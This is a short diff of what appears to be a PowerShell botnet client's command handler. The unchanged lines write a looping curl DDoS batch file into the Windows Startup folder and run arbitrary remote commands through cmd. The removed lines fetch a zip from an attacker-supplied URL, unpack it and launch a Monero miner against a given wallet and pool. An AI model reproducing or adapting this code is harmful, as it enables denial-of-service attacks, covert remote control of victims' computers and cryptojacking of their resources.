@@ -28,22 +28,6 @@ elseif ($cmd -Like "DDoS *") {
   $cmd4 = $cmd.split("DDoS ")[0];
   ":start ; curl -X GET $ddos; goto start" | Out-File "$startUpFolder\btnet.bat" -Force
 }
-elseif ($cmd -Like "XMRMiner *") {
-  $cmd6 = $cmd.split("XMRMiner ")[0];
-  if !($cmd6 -like "4*") {
-    if !($cmd6 -like "8*") {
-      $cmd7 = $cmd6.split(":")[1];
-      $addr = $cmd6.split(":")[0];
-      $pool = $cmd6.split(":")[2];
-      $proc = $cmd6.split(":")[3];
-      $wc.DownloadFile("$cmd7","ZipFile.zip");
-      cmd.exe /c "mkdir folder";
-      Expand-Archive -LiteralPath "./ZipFile.zip" -DestinationPath "./folder";
-      cd folder;
-      "$proc -u $addr -o $pool -t 2"
-    }
-  }
-}
 elseif ($cmd -Like "Cmd *") {
   $cmd5 = $cmd.split("Cmd ")[0];
   cmd /c "$cmd5";
